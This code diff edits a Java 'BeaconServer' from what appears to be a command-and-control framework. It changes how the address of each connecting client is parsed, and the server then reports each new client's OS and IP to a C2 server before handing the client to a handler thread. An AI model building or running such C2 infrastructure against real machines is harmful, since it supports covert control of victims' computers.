@@ -234,15 +234,22 @@ public class BeaconServer implements Runnable{
                 // Accept new client
                 Socket socket = serverSocket.accept();
                 Duplexer duplexer = new Duplexer(socket);
+
                 // Get clients IP Address
-                String IPAddress = socket.getRemoteSocketAddress().toString();
+                // getRemoteSocketAddress retruns in the form /IPAddress:Port (i.e. /1.2.3.4:12345)
+                // We just care about the IP Address though
+                String unformattedIPAddress = socket.getRemoteSocketAddress().toString();
+                String IPAddress = unformattedIPAddress.split(":")[0].substring(1);
                 String OSMessage = duplexer.receive();
+
                 // Send message to C2 announcing that a new client has been obtained
                 C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
+
                 // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
                 BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this);
                 Thread clientHandlerThread = new Thread(clientHandler);
                 clientHandlerThread.start();
+
                 // Add to client lists
                 if(OSMessage.equals("Windows")){
                     windowsClientObjects.put(IPAddress,clientHandler);
